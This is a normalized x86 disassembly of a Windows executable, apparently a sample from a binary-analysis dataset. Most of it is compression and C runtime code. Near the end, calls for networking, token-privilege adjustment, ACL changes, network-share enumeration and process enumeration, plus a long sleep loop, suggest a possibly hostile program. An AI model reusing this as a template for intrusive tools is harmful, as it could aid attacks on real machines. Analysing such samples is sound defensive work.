mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x40 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x406 ]
mov [ ebp - 0x20 ] ecx
mov edx 0x10
sub edx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x2 ]
mov [ ebp - 0x18 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x402 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16ac ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x404 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x404 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x24 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + eax * 4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x100
jae r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
sub eax [ edx * 4 + r--data ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov edx 0x10
sub edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax * 4 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
cmp ecx [ eax + 0x1698 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x7
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x48 ] ecx
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx + r--data ]
mov [ ebp - 0x48 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x2c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x2c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x28 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x34 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x34 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x30 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x2 ]
mov [ ebp - 0x30 ] edx
mov eax 0x10
sub eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
sub eax [ edx * 4 + r--data ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x38 ] ecx
mov edx 0x10
sub edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax * 4 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x38 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x3c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x38 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
sub_40b9ca
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xc ] 0x80
jge r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x8c ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x100
jge r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x8c ]
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x7
jge r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x2
cmp eax [ ebp - 0x4 ]
sbb ecx ecx
inc ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] cl
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x8c ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_40ba7c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
and eax 0x1
mov ecx [ ebp - 0x4 ]
or ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
shr edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp - 0x4 ]
shl eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
sub ecx 0x1
mov [ ebp + 0xc ] ecx
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0x1
mov esp ebp
pop ebp
retn
sub_40babd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x8
jl r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] 0x0
jmp r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
mov al [ eax + 0x16b0 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
shr dx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16b4 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
sub_40bba6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x8
jle r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] 0x0
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov cl [ ecx + 0x16b0 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
sub_40bc62
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_40bba6
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16ac ] 0x8
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
and edx 0xffff
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x10 ]
and ecx 0xffff
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x10 ]
not eax
and eax 0xffff
and eax 0xff
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x14 ]
mov [ edx + ecx ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x10 ]
not edx
and edx 0xffff
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov edx [ ebp + 0xc ]
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
jmp r-xdata
sub_40bd90
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40bdd0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40bf91
cmp [ rw-data ] ebx
jne r-xdata
call sub_40bf7c
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40bf8e
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40104c
mov eax r-xdata
retn
sub_401490
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call WSAStartup
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_401ae0
push esi
mov esi [ Sleep@IAT ]
call sub_403390
call sub_402b60
call sub_402690
push 0x112a880
call esi
jmp r-xdata
sub_403a30
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x0
push ecx
call [ AdjustTokenPrivileges@IAT ]
retn
WSAStartup
jmp [ WSAStartup@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
sub_4086a0
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_4086aa
push ebp
mov ebp esp
mov eax 0x2
sub eax [ ebp + 0x8 ]
mov eax [ eax * 4 + rw-data ]
pop ebp
retn
sub_4086e7
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call free
add esp 0x4
pop ebp
retn
sub_408a16
push ebp
mov ebp esp
pop ebp
retn
SetSecurityInfo
jmp [ SetSecurityInfo@IAT ]
SetEntriesInAclA
jmp [ SetEntriesInAclA@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
free
jmp [ free@IAT ]
_ftol
jmp [ _ftol@IAT ]
sub_40bf51
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
memcpy
jmp [ memcpy@IAT ]
memset
jmp [ memset@IAT ]
calloc
jmp [ calloc@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40bf7c
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40bf8e
xor eax eax
retn
sub_40bf91
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_40bfb0
mov eax r--data
jmp __CxxFrameHandler
